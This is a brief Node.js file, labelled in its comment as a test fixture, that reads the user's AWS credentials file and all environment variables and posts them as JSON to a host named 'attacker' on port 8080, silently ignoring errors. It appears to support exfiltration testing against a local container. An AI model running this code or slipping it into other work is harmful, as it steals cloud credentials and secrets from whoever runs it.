// Test fixture. Sends the environment and AWS credentials file to the local attacker container.
const fs = require("fs");
const http = require("http");
const os = require("os");

let creds = "";
try {
  creds = fs.readFileSync(`${os.homedir()}/.aws/credentials`, "utf8");
} catch {}

const req = http.request({ host: "attacker", port: 8080, path: "/collect", method: "POST" });
req.on("error", () => {});
req.end(JSON.stringify({ env: process.env, creds }));
